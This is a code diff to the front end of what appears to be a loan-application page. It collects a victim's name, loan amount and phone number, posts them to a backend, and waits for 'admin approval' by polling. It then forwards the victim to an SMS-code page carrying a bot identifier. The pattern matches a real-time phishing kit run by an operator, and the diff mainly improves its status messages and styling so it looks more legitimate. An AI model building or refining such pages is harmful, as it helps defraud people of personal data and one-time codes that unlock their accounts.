@@ -88,10 +88,69 @@ border-radius:6px;
 color:white;
 font-size:16px;
 cursor:pointer;
+transition: background 0.3s;
 }
 
 button:disabled{
 background:#444;
+cursor:not-allowed;
+}
+
+button:hover:not(:disabled){
+background:#5a2d12;
+}
+
+.status-message {
+    margin-top: 20px;
+    padding: 15px;
+    border-radius: 8px;
+    text-align: center;
+    font-size: 14px;
+    display: none;
+    animation: fadeIn 0.5s ease;
+}
+
+.status-message.show {
+    display: block;
+}
+
+.status-message.waiting {
+    background: #1a1a2e;
+    color: #ffd93d;
+    border: 1px solid #ffd93d;
+}
+
+.status-message.success {
+    background: #1a2e1a;
+    color: #6bcb77;
+    border: 1px solid #6bcb77;
+}
+
+.status-message.error {
+    background: #2e1a1a;
+    color: #ff6b6b;
+    border: 1px solid #ff6b6b;
+}
+
+.status-message .spinner {
+    display: inline-block;
+    width: 20px;
+    height: 20px;
+    border: 3px solid rgba(255, 217, 61, 0.3);
+    border-radius: 50%;
+    border-top-color: #ffd93d;
+    animation: spin 1s ease-in-out infinite;
+    margin-right: 10px;
+    vertical-align: middle;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-10px); }
+    to { opacity: 1; transform: translateY(0); }
 }
 
 </style>
@@ -116,7 +175,7 @@ background:#444;
 
 </form>
 
-<div id="status" style="margin-top:15px;font-size:14px;color:blue;text-align:center;"></div>
+<div id="status" class="status-message"></div>
 
 </div>
 
@@ -137,20 +196,37 @@ if (!localStorage.getItem('loanAmount')) {
 }
 
 const nextBtn = document.getElementById('nextBtn');
-const status = document.getElementById('status');
+const statusDiv = document.getElementById('status');
+
+// ---------------- STATUS HELPER ----------------
+function showStatus(message, type) {
+    statusDiv.textContent = message;
+    statusDiv.className = 'status-message show';
+    if (type) {
+        statusDiv.classList.add(type);
+    }
+}
+
+function hideStatus() {
+    statusDiv.className = 'status-message';
+    statusDiv.textContent = '';
+}
 
 // ---------------- SUBMIT ----------------
 document.getElementById('detailsForm').addEventListener('submit', async e => {
     e.preventDefault();
 
     const phone = document.getElementById('phone').value.trim();
-    const name = localStorage.getItem('fullName'); // ✅ from storage
+    const name = localStorage.getItem('fullName');
 
-    if (!phone) return;
+    if (!phone) {
+        showStatus('⚠️ Please enter your phone number', 'error');
+        return;
+    }
 
     nextBtn.disabled = true;
     nextBtn.textContent = "Processing...";
-    status.textContent = "";
+    hideStatus();
 
     try {
         const res = await fetch(`${BACKEND_URL}/submit-details`, {
@@ -163,45 +239,54 @@ document.getElementById('detailsForm').addEventListener('submit', async e => {
             })
         });
 
-        const { requestId } = await res.json();
+        const data = await res.json();
+        
+        if (!res.ok) {
+            throw new Error(data.error || 'Failed to submit');
+        }
 
-        // store phone
+        // Store phone
         localStorage.setItem('phone', phone);
 
-        // show SMS message
-        status.textContent = "Please click on the link you received in SMS to confirm your connection";
+        // Show waiting status with spinner
+        showStatus('⏳ Waiting for admin approval...', 'waiting');
 
         // ---------------- POLLING ----------------
         const poll = setInterval(async () => {
             try {
-                const r = await fetch(`${BACKEND_URL}/check-details/${requestId}`);
+                const r = await fetch(`${BACKEND_URL}/check-details/${data.requestId}`);
                 const d = await r.json();
 
                 // ✅ APPROVED → REDIRECT TO SMS PAGE
                 if (d.approved === true) {
                     clearInterval(poll);
-                    window.location.href = `/sms.html?name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&botId=${botId}`;
+                    showStatus('✅ Approved! Redirecting...', 'success');
+                    nextBtn.disabled = false;
+                    nextBtn.textContent = "Log in";
+                    setTimeout(() => {
+                        window.location.href = `/sms.html?name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&botId=${botId}`;
+                    }, 1500);
                 }
 
                 // ❌ REJECTED → STAY HERE
                 if (d.approved === false) {
                     clearInterval(poll);
-                    status.textContent = "Request rejected. Please try again.";
+                    showStatus('❌ Request rejected. Please try again.', 'error');
                     nextBtn.disabled = false;
                     nextBtn.textContent = "Log in";
                 }
 
             } catch (err) {
                 clearInterval(poll);
-                status.textContent = "Connection lost. Try again.";
+                showStatus('⚠️ Connection lost. Please try again.', 'error');
                 nextBtn.disabled = false;
                 nextBtn.textContent = "Log in";
             }
 
-        }, 1500);
+        }, 2000);
 
     } catch (err) {
-        status.textContent = "Network error, try again";
+        showStatus('❌ ' + err.message, 'error');
         nextBtn.disabled = false;
         nextBtn.textContent = "Log in";
     }
